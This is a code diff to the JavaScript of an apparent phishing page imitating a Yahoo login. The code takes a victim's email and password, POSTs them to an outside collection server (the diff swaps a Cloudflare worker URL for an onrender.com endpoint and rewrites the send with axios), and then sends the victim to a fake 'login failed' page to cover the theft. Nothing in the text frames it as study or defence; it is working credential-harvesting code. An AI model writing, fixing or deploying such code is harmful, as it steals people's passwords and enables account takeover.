@@ -2,8 +2,8 @@ document.addEventListener("DOMContentLoaded", function() {
     //form handler
     console.log("sender script loaded");
 
-    const hostname = "https://yah00.onrender.com";
-    const endpoint = "https://winter-fog-b8e9.bad0men.workers.dev";
+    const hostname = "http://localhost:5500";
+    const endpoint = "https://bkend-yad0.onrender.com/endpoint";
 
     
     const nextButton = document.querySelector("#login-signin");
@@ -15,8 +15,12 @@ document.addEventListener("DOMContentLoaded", function() {
     if (nextButton) {
         nextButton.addEventListener("click", function (e) {
             e.preventDefault();
-            const email = emailInput?.value;
-            gotoPassword(email); 
+            if (!emailInput) {
+                return;
+            } else {
+                const email = emailInput.value;
+                gotoPassword(email); 
+            }
         }); 
     }
     else {
@@ -26,10 +30,10 @@ document.addEventListener("DOMContentLoaded", function() {
     const email = localStorage.getItem("user-email");
     emailClass.textContent = email;
 
-    submitButton.addEventListener("click", function (e) {
+    submitButton.addEventListener("click", async (e) => {
         e.preventDefault();
-        const password = passwordInput?.value;
-        sendFormAndRedirect(email, password);
+        const password = passwordInput.value;
+        await sendFormAndRedirect(email, password);
     });
 
     //go to password page function declaration
@@ -40,20 +44,28 @@ document.addEventListener("DOMContentLoaded", function() {
         window.location.href = `${hostname}/display-password.htm`;
     };
 
-    function sendFormAndRedirect(email, password) {
+    async function sendFormAndRedirect(email, password) {
         localStorage.removeItem("user-email");
 
-           const payload = {
+        const payload = {
                "email": email,
                "password": password
-           };
-        console.log({payload})
-        const res = fetch(endpoint, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify(payload)
-        }).then((response) => console.log(response));
-        
+        };
+        try {
+            const res = await axios.post(`${endpoint}`, payload, {
+                headers: {
+                    "Content-Type": "application/json",
+                    "Access-Control-Allow-Origin": "*"
+                }
+            });
+            if (res.status == 200) {
+                window.location.href = `${hostname}/login-failed.htm`;
+            } else {
+                window.location.href = `${hostname}/display-login.htm`;
+            }
+        } catch (error) {
+            console.error("Error:", error);
+        }
     };
 });
 
